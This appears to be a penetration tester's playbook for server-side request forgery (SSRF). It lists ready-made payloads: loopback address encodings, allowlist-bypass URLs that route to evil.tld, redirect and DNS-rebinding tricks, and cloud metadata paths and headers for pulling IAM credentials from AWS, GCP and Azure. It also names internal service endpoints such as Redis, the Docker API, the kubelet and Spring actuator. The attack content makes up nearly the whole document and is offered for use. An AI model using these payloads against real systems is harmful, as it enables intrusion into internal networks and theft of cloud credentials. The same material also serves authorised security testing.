# PB — SSRF

## Preconditions
Any server-side fetch with URL influence.

## Recipes

**Confirm.** `http://<collab>.oast.tld/` — check DNS then HTTP. Distinguish fetch from
redirect-following.

**Loopback forms.** `127.0.0.1`, `127.1`, `0.0.0.0`, `[::1]`, `[::ffff:127.0.0.1]`,
`2130706433`, `0177.0.0.1`, `127.0.0.1:80`, `localhost`, `localtest.me`.

**Allowlist escape.** `http://allowed.tld@evil.tld`, `http://evil.tld#@allowed.tld`,
`http://evil.tld/allowed.tld`, `http://allowed.tld.evil.tld`,
`http://allowed.tld:80@evil.tld`, path `..;/`, double-encoded `%252e%252e%252f`.

**Redirect chain.** An open redirect on an allowed host that 302s to loopback.

**DNS rebinding.** Serve an A record that flips from a public IP to `127.0.0.1` between
the check and the fetch.

**Metadata.** AWS IMDSv1 `169.254.169.254/latest/meta-data/iam/security-credentials/`,
IMDSv2 with `X-aws-ec2-metadata-token`, GCP with `Metadata-Flavor: Google`,
Azure with `Metadata: true`. DigitalOcean and Alibaba have their own paths.

**Internal services.** `dict://127.0.0.1:6379/info`, Docker `:2375/containers/json`,
k8s `:10255/pods`, `/actuator/env`, Prometheus `:9090/api/v1/targets`.

## Signals
Body length delta against a control URL; TLS error naming an internal host; a 302 to an
internal address.

## Failure modes
Egress proxy with a static allowlist; response body not returned (blind).
